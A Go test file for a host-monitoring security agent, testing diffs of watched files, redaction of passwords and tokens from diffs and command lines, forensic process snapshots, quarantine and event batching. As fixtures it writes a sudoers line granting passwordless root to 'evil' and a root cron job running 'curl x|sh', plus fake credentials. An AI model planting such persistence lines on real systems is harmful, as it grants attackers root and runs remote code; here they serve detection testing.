package agent

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/akquisio-dev/vigil/internal/proto"
)

func TestUnifiedDiff(t *testing.T) {
	a := strings.Split("a\nb\nc\nd\ne\nf\ng\nh", "\n")
	if d, _ := unifiedDiff("x", strings.Split("1\n2\n3\n4\n5\n6\n7\n8\n9\n10", "\n"), strings.Split("1\nX\n3\n4\n5\n6\n7\n8\nY\n10", "\n")); d != "@@ line 1\n 1\n-2\n+X\n 3\n 4\n@@ line 7\n 7\n 8\n-9\n+Y\n 10\n" {
		t.Fatalf("two hunks:\n%s", d)
	}
	b := strings.Split("a\nb\nc\nX\ne\nf\ng\nh\ni", "\n")
	got, trunc := unifiedDiff("x", a, b)
	want := "@@ line 2\n b\n c\n-d\n+X\n e\n f\n g\n h\n+i\n"
	if got != want || trunc {
		t.Fatalf("diff:\n%s", got)
	}
	if d, _ := unifiedDiff("x", a, a); d != "" {
		t.Fatal("no change, no diff")
	}
	// Large rewrites fall back to remove all, add all.
	var big1, big2 []string
	for i := 0; i < 1500; i++ {
		big1 = append(big1, "old"+string(rune('a'+i%26)))
		big2 = append(big2, "new"+string(rune('a'+i%26)))
	}
	d, trunc := unifiedDiff("x", big1, big2)
	if !trunc || len(d) > diffMaxBytes {
		t.Fatalf("truncation: %d bytes, %v", len(d), trunc)
	}
}

func TestDiffNeverCarriesSecrets(t *testing.T) {
	old := "Defaults env_reset\n"
	cur := "Defaults env_reset\nDB_PASSWORD=hunter22hunter\nexport API_TOKEN=\"ghp_" + strings.Repeat("a", 36) + "\"\nmysql://app:S3cr3tPw@db/x\npassword hunter33\n"
	d, _ := unifiedDiff("conf", splitLines([]byte(old)), splitLines([]byte(cur)))
	for _, s := range []string{"hunter22", "ghp_aaa", "S3cr3tPw", "hunter33"} {
		if strings.Contains(d, s) {
			t.Fatalf("secret %q in diff:\n%s", s, d)
		}
	}
	if keep := redactLine("sshd_config", "PasswordAuthentication no"); keep != "PasswordAuthentication no" {
		t.Fatalf("settings named after passwords are not secrets: %q", keep)
	}
	if !strings.Contains(d, "+DB_PASSWORD=[removed]") {
		t.Fatalf("diff:\n%s", d)
	}
}

func TestFileChangesCarryTheirLines(t *testing.T) {
	dir := t.TempDir()
	sudo := write(t, dir+"/sudoers", "root ALL=(ALL) ALL\n", 0o440)
	shadow := write(t, dir+"/shadow", "root:$6$abc:1::::::\n", 0o600)
	a := &Agent{cfg: &Config{MaxQueue: 100, StateDir: t.TempDir(), WatchFiles: []string{dir + "/*"}}, state: &State{Files: map[string]FileState{}, Users: map[string]int{}, Keys: map[string][]AuthKey{}}, flushNow: make(chan struct{}, 1)}
	a.scanFiles() // baseline, keeps copies
	a.state.Initialized = true
	eventTypes(a)
	if _, ok := a.contents().get(shadow); ok {
		t.Fatal("shadow content must never be stored")
	}
	os.WriteFile(sudo, []byte("root ALL=(ALL) ALL\nevil ALL=(ALL) NOPASSWD: ALL\n"), 0o440)
	os.WriteFile(shadow, []byte("root:$6$def:1::::::\n"), 0o600)
	write(t, dir+"/cron.new", "* * * * * root curl x|sh\n", 0o644)
	a.scanFiles()
	ev := eventTypes(a)
	var sudoDiff, shadowDiff, added any
	for _, d := range ev["file.changed"] {
		switch d["path"] {
		case sudo:
			sudoDiff = d["diff"]
		case shadow:
			shadowDiff = d["diff"]
			if d["diff_note"] != nil {
				t.Fatal("shadow must not even say content is unknown")
			}
		}
	}
	for _, d := range ev["file.added"] {
		added = d["diff"]
	}
	if s, _ := sudoDiff.(string); !strings.Contains(s, "+evil ALL=(ALL) NOPASSWD: ALL") {
		t.Fatalf("sudoers diff: %v", sudoDiff)
	}
	if shadowDiff != nil {
		t.Fatalf("shadow diff: %v", shadowDiff)
	}
	if s, _ := added.(string); !strings.Contains(s, "+* * * * * root curl x|sh") {
		t.Fatalf("added: %v", added)
	}
	os.Remove(sudo)
	a.scanFiles()
	if d := eventTypes(a)["file.removed"]; len(d) != 1 || !strings.Contains(d[0]["diff"].(string), "-evil") {
		t.Fatalf("removed: %v", d)
	}
	// After an upgrade there is no copy yet: say so instead of a full diff.
	a2 := &Agent{cfg: &Config{MaxQueue: 100, StateDir: t.TempDir(), WatchFiles: []string{dir + "/*"}}, state: &State{Files: a.state.Files, Users: map[string]int{}, Keys: map[string][]AuthKey{}, Initialized: true}, flushNow: make(chan struct{}, 1), contentSeeded: true}
	write(t, dir+"/cron.new", "* * * * * root true\n", 0o644)
	a2.scanFiles()
	if d := eventTypes(a2)["file.changed"]; len(d) != 1 || d[0]["diff_note"] != "previous content unknown" {
		t.Fatalf("unknown previous: %v", d)
	}
}

func TestSnapshotOfOwnProcess(t *testing.T) {
	st := t.TempDir()
	on := true
	a := &Agent{cfg: &Config{MaxQueue: 100, StateDir: st, Quarantine: &on}, state: &State{}, flushNow: make(chan struct{}, 1)}
	a.snapshot(os.Getpid(), "test", "req1", "al1")
	ev := eventTypes(a)["forensics.snapshot"]
	if len(ev) != 1 {
		t.Fatalf("events: %v", ev)
	}
	d := ev[0]
	tg, _ := d["target"].(map[string]any)
	if d["request"] != "req1" || d["alert"] != "al1" || tg == nil || len(tg["exe_sha256"].(string)) != 64 || d["sha256"] == nil {
		t.Fatalf("snapshot: %v", d)
	}
	if procs, _ := d["processes"].([]snapProc); len(procs) == 0 {
		t.Fatal("no process list")
	}
	if os.Geteuid() == 0 {
		q, _ := tg["quarantined"].(string)
		if fi, err := os.Stat(q); err != nil || fi.Mode().Perm() != 0o400 || filepath.Dir(q) != filepath.Join(st, "quarantine") {
			t.Fatalf("quarantine: %v %v", q, tg["quarantine_error"])
		}
	}
	for _, n := range tg["env_names"].([]string) {
		if strings.Contains(n, "=") {
			t.Fatal("environment values must not be sent")
		}
	}
	// Quarantine is opt-in.
	a.cfg.Quarantine = nil
	a.snaps = snapLimiter{}
	a.snapshot(os.Getpid(), "test", "", "")
	if tg := eventTypes(a)["forensics.snapshot"][0]["target"].(map[string]any); tg["quarantined"] != nil {
		t.Fatal("quarantine without opt-in")
	}
	// Requests run once; expired ones say so.
	a.runSnapshots([]proto.SnapshotRequest{{ID: "old", Expires: time.Now().Add(-time.Minute)}})
	a.runSnapshots([]proto.SnapshotRequest{{ID: "old", Expires: time.Now().Add(time.Minute)}})
	if ev := eventTypes(a)["forensics.snapshot"]; len(ev) != 1 || ev[0]["error"] == nil {
		t.Fatalf("expired: %v", ev)
	}
}

func TestSnapLimiter(t *testing.T) {
	var l snapLimiter
	now := time.Now()
	if !l.allow(10, now) || l.allow(10, now.Add(time.Minute)) {
		t.Fatal("one per process in ten minutes")
	}
	n := 1
	for pid := 11; pid < 40; pid++ {
		if l.allow(pid, now) {
			n++
		}
	}
	if n != snapMaxPerHour {
		t.Fatalf("hourly cap: %d", n)
	}
	if !l.allow(99, now.Add(61*time.Minute)) {
		t.Fatal("cap resets after an hour")
	}
}

func TestCommandLinesLoseTheirSecrets(t *testing.T) {
	cases := []string{
		"./srcds_linux -game garrysmod +rcon_password hunter44 +map rp_x",
		"./srcds_linux +sv_setsteamaccount 0123456789ABCDEF0123456789ABCDEF +maxplayers 64",
		"ArkAscendedServer.exe TheIsland_WP?listen?ServerAdminPassword=hunter55?Port=7777",
		"mysql -u root -phunter66 swrp",
		"node app.js --password hunter77 --token=hunter88",
		"curl -H Authorization: https://bot:hunter99x@example.org",
	}
	for _, c := range cases {
		got := redactCmd(c)
		if strings.Contains(got, "hunter") || strings.Contains(got, "0123456789ABCDEF") {
			t.Errorf("secret left in %q", got)
		}
	}
	for _, keep := range []string{"/usr/sbin/sshd -D", "PasswordAuthentication no", "sudo -u www-data php artisan", "Defaults !authenticate", "root ALL=(ALL) NOPASSWD: ALL"} {
		if got := redactCmd(keep); got != keep {
			t.Errorf("changed %q to %q", keep, got)
		}
	}
}

func TestSplitBatch(t *testing.T) {
	big := strings.Repeat("x", 350<<10)
	var q []proto.Event
	for i := 0; i < 4; i++ {
		q = append(q, proto.NewEvent("forensics.snapshot", map[string]any{"pad": big}))
	}
	q = append(q, proto.NewEvent("huge", map[string]any{"pad": strings.Repeat("y", 900<<10)}), proto.NewEvent("small", nil))
	var sent [][]proto.Event
	var dropped []string
	for len(q) > 0 {
		b, rest, tooBig := splitBatch(q, batchMaxBytes)
		dropped = append(dropped, tooBig...)
		if len(b) == 0 && len(rest) == len(q) {
			t.Fatal("no progress")
		}
		sent, q = append(sent, b), rest
	}
	if len(sent) != 2 || len(sent[0]) != 2 || len(sent[1]) != 3 || len(dropped) != 1 || dropped[0] != "huge" {
		t.Fatalf("batches %d, dropped %v", len(sent), dropped)
	}
}
